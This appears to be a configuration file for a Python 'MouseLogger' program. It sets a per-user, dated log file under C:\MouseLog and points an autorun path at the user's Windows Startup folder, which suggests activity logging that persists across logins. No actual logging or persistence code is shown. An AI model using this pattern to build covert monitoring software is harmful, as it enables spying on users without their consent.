from time import strftime
from getpass import getuser

USER_NAME = getuser()

LOG_NAME = "MouseLog"

LOG_DIR = "C:\\" + LOG_NAME + "\\"

MOUSELOGGER_FILE = "{}-{}.txt".format(USER_NAME, strftime('%Y-%m-%d'))

APP_FILE_NAME = "MouseLogger"

AUTORUN_DIR = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(USER_NAME)
